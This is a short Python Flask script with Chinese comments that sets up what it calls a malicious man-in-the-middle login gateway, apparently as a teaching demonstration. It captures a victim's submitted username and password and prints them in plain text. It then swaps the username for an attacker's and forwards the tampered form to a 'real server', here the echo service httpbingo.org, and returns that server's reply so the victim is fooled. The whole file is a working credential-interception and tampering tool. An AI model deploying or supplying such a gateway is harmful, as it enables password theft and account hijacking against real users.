from flask import Flask, request
import requests

app = Flask(__name__)

# 黑客伪造的登录接口，监听 8080 端口
@app.route('/login', methods=['POST'])
def intercept():
    # 1. 截获（Steal）：获取受害者的表单数据
    victim_user = request.form.get('username')
    victim_pass = request.form.get('password')
    
    print("\n[警报] 成功截获目标数据！")
    print(f" => 提取账号: {victim_user}")
    print(f" => 提取明文密码: {victim_pass}")

    # 2. 篡改（Tamper）：黑客把账号偷偷换成自己的名字
    print("[操作] 正在篡改数据包...")
    tampered_data = {
        "username": "Hacker_xiaohei666", # 狸猫换太子
        "password": victim_pass
    }

    # 3. 转发（Forward）：黑客代替受害者，把篡改后的数据发给【真实的服务器】
    real_server_url = "https://httpbingo.org/post"
    print(f"[操作] 正在向真实服务器 {real_server_url} 转发...")
    real_response = requests.post(real_server_url, data=tampered_data)

    # 4. 欺骗（Deceive）：把真实服务器的响应，原封不动地还给受害者
    return real_response.text

if __name__ == '__main__':
    print("[监听中] 中间人恶意网关已启动，等待目标上钩 (端口: 8080)...")
    app.run(port=8080)